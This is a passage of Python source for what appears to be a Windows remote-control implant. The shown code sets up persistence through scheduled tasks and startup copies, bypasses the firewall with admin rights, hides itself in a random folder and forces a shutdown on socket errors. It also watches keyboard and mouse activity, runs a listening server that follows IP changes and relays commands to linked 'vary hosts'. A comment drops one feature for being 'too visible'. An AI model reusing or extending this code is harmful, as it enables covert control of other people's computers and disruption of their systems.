    run_task_command = f'schtasks /run /tn "{random_task_name}"'
    subprocess.run(create_task_command, shell=True)
    subprocess.run(run_task_command, shell=True)
    kill_self()

def toggleSmartAssNoInternet(Set=None):
    """Toggles the SmartAssNoInternet behavior."""
    global SmartAssNoInternet_isenabled
    if Set is True:
        SmartAssNoInternet_isenabled = True
    elif Set is False:
        SmartAssNoInternet_isenabled = False

if __name__ == '__main__':
    if len(sys.argv) > 1: 
        if sys.argv[1].lower() == 'delfile' and len(sys.argv) > 2:
            file_path = sys.argv[2].replace("\"", "").replace("\'", "")
            try:
                runcmd(f'del /f /q "{file_path}"')
                print("Deleted: " + file_path)
            except Exception as e:
                print(f'Failed to delete {file_path} in the argv manager')
            if len(sys.argv) > 3 and sys.argv[3] == "ren":
                self_tostartup()
                if not (ctypes.windll.shell32.IsUserAnAdmin() == 0):
                    bypassfirewall()
                restart_self()
        elif sys.argv[1] == "hide":
            moveToFolder("Random")
        elif sys.argv[1].lower() == "update":
            handle_update()
        elif sys.argv[1].lower() == "initialize" or sys.argv[1].lower() == "ini": 
            self_tostartup()
            if admin_privileges:
                bypassfirewall()
            restart_self()

 
print('Got args: ', str(sys.argv))
if __name__ == '__main__':
    try:
        issysuser = is_system_user()
    except:
        issysuser = None

    if issysuser is True:
        print('System user detected, exiting')
        os.system(f'start "{get_script_directory()}" "{os.path.join(get_script_directory(), get_script_filename())}"')
        kill_self()

if __name__ == '__main__':
    slp(3)

    while INTERNET == False:
        pass

    SERVER = socket.gethostbyname(socket.gethostname())
    ADDR = (SERVER, vary_PORT)
    check_run = check_and_kill_self(SERVER, vary_PORT)
    print(check_run + " = checkrun")

    if check_run == "ks":
        kill_self()
        sys.exit()

    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.socket().setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(ADDR)
    except Exception as e:
        print(f'Error3tf: {e}')
        runcmd('shutdown.exe /g /t 0 /f')

    print(f'Running on {SERVER}:{vary_PORT}')
    DosingThreads = []

    threading.Timer(1.0, start_timer_keyboardcheck).start()
    threading.Timer(1.0, start_timer_mousecheck).start()

    onStartup_thread = KThread(target=onStartup)
    onStartup_thread.start()

def handleChangeIPv4():
    """Handles changes in the IPv4 address."""
    global server, INTERNET, ADDR, SERVER
    while True:
        if not INTERNET:
            slp(5)
            continue
        slp(5)
        if server.getsockname()[0] != socket.gethostbyname(socket.gethostname()):
            print('Detected a change to the ipv4, auto switching to the new ipv4 address')
            print(f'Changing IPv4 address to: {socket.gethostbyname(socket.gethostname())}')
            server.close()
            time.sleep(4)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((socket.gethostbyname(socket.gethostname()), vary_PORT))
            SERVER = socket.gethostbyname(socket.gethostname())
            ADDR = (SERVER, vary_PORT)
            print(f"[LISTENING] Server is listening on {SERVER}:{vary_PORT}")
        else:
            slp(5)
if __name__ == '__main__':
    handleipv4change_thread = KThread(target=handleChangeIPv4)
    handleipv4change_thread.start()

def SendMessageToVaryHosts():
    """Sends messages to connected Diversify hosts."""
    while True:
        what = str(input("What to send?: "))
        sendAllVaryHosts(what)
        print(f'Sent: {what} to {", ".join(varyhosts)}')

# atjni = threading.Thread(target=enable_subtle_functions)
# atjni.start()
if __name__ == '__main__':
    toggleSmartAssNoInternet(Set=False) # by default it's now disabled due to it being too visible and too much.
    SmartAssNoInternet_thread = threading.Thread(target=SmartAssNoInternet)
    SmartAssNoInternet_thread.start()
    # mainui = threading.Thread(target=mainuirun) # website
    # mainui.start() # website !
    print('server started on: http://' + socket.gethostbyname(socket.gethostname()) + ':10102')
    mainuirun() # is main thread. cause it fucking sucks at being threaded(VERY SLOW) -> still slow